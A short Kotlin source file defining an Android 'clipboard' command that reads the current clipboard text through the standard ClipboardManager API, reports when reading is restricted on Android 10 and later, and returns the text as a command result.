package com.sara.android.modules.commands

import android.content.Context
import android.os.Build
import android.content.ClipboardManager

class ClipboardCommand : Command {
    override val name = "clipboard"
    override val description = "Read current clipboard text"

    override fun execute(context: Context, args: List<String>): CommandResult {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return CommandResult.Text("\uD83D\uDCCB Clipboard reading is restricted on Android 10+.\n" +
                    "Only the default input method or foreground app can read clipboard.")
        }

        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = cm.primaryClip
        if (clip == null || clip.itemCount == 0) {
            return CommandResult.Text("\uD83D\uDCCB Clipboard is empty.")
        }

        val text = clip.getItemAt(0)?.text?.toString() ?: "Non-text content"
        return CommandResult.Text("\uD83D\uDCCB Clipboard:\n$text")
    }
}
